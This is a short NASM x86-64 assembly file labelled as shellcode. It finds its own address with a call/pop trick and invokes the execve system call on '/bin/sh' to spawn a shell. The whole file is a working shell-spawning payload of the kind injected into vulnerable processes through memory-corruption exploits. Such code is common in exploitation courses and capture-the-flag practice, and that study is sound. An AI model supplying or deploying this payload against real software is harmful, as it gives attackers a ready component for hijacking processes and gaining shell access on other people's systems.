; shellcode
; compile with nasm
[BITS 64]

global _start

; find the load base
_start:
    call _get_rip
_get_rip:
    pop rcx

__real_start:
    lea rcx, [rcx - _get_rip + str]
    mov eax, 59
    mov rdi, rcx
    mov rsi, 0
    mov rdx, 0
    syscall

_data:
str: db "/bin/sh\0"